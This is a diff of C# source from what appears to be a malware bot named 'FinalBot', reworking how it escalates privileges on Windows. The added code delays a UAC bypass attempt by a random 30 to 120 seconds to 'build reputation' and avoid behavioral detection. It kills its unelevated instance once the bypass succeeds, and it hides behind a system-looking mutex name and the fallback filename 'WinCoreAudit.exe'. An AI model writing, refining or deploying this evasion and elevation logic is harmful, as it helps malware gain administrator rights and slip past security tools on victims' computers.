@@ -119,30 +119,40 @@ namespace FinalBot
             // 3. Generate behavioral noise
             SafetyManager.AntiBehavior();
 
-            // 3. UAC Check & Bypass (Skip if already injected/elevated)
+            // 3. Lazy UAC Elevation (Skip if already injected/elevated or in a debug/safe context)
             if (!isInjected && !ElevationService.IsAdmin())
             {
-                // Native path retrieval for stability
-                var sb = new StringBuilder(1024);
-                Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
-                string selfPath = sb.ToString();
-                
-                if (string.IsNullOrEmpty(selfPath)) selfPath = "WinCoreAudit.exe";
-                
-                DebugLog("[UAC] Releasing mutex to allow elevated child...");
-                _mutex?.Dispose();
-                _mutex = null;
-                Thread.Sleep(500);
-
-                // Try V3 Hardcore Injection first
-                if (ElevationService.RequestElevation(selfPath))
+                _ = Task.Run(async () =>
                 {
-                    DebugLog("UAC bypass successful (V3 or Chain). Exiting parent.");
-                    Process.GetCurrentProcess().Kill();
-                }
-                
-                DebugLog("[UAC] All bypass methods failed. Continuing as User.");
-                _mutex = new Mutex(true, "Global\\Vanguard_System_Runtime_7X2B9", out _);
+                    try 
+                    {
+                        // Build reputation for a random duration (30s to 120s) before attempting bypass
+                        Random r = new Random();
+                        int delay = r.Next(30000, 120000);
+                        DebugLog($"[UAC] Lazy Elevation pending. Postponing for {delay / 1000}s to build reputation...");
+                        await Task.Delay(delay);
+
+                        // Native path retrieval for stability
+                        var sb = new StringBuilder(1024);
+                        Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
+                        string selfPath = sb.ToString();
+                        if (string.IsNullOrEmpty(selfPath)) selfPath = "WinCoreAudit.exe";
+
+                        DebugLog("[UAC] Attempting Lazy Elevation sequence...");
+                        _mutex?.Dispose();
+                        _mutex = null;
+
+                        if (ElevationService.RequestElevation(selfPath))
+                        {
+                            DebugLog("UAC bypass successful. Terminating reputation-builder instance.");
+                            Process.GetCurrentProcess().Kill();
+                        }
+                        
+                        DebugLog("[UAC] Lazy Elevation failed or suppressed. Re-acquiring mutex for user-level operation.");
+                        _mutex = new Mutex(true, "Global\\Vanguard_System_Runtime_7X2B9", out _);
+                    }
+                    catch (Exception ex) { DebugLog($"[UAC] Lazy Elevation task error: {ex.Message}"); }
+                });
             }
             else if (ElevationService.IsAdmin())
             {
